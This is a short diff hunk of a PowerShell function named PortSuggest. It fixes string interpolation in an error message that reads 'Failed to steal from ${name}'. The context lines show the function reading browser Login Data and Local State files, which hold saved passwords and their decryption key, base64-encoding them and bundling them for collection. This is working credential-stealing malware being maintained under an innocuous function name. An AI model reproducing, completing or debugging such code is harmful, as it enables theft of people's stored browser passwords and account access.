@@ -423,7 +423,7 @@ function PortSuggest {
                 $stateB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($localState))
                 $result += "`n[$name]::LoginData::$loginB64::LocalState::$stateB64::END"
             } catch {
-                $result += "`n[ERROR] Failed to steal from $name: $($_.Exception.Message)"
+                $result += "`n[ERROR] Failed to steal from ${name}: $($_.Exception.Message)"
             }
         }
     }
